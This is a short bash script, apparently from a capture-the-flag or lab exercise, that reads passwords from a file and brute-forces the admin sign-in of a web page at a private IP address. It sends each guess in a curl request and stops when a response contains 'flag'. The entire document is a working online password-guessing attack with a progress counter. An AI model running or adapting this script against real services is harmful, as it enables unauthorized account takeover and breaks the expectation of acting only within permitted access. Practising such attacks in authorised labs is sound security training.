#!/bin/bash

pswdlist=($(cat pswdlist))
length=${#pswdlist[@]}
current=0
ip_address="10.11.200.193"

for pswd in "${pswdlist[@]}"
do
    response=$(curl -s "http://$ip_address/?page=signin&username=admin&password=$pswd&Login=Login" | grep "flag")

    if [ ! -z "$response" ]; then
        echo "FOUND IT ! Password is : $pswd"
        echo $response
        break
    fi

    current=$((current+1))
    echo -ne "Current progress : $(((current * 100) / length))%\r"

done

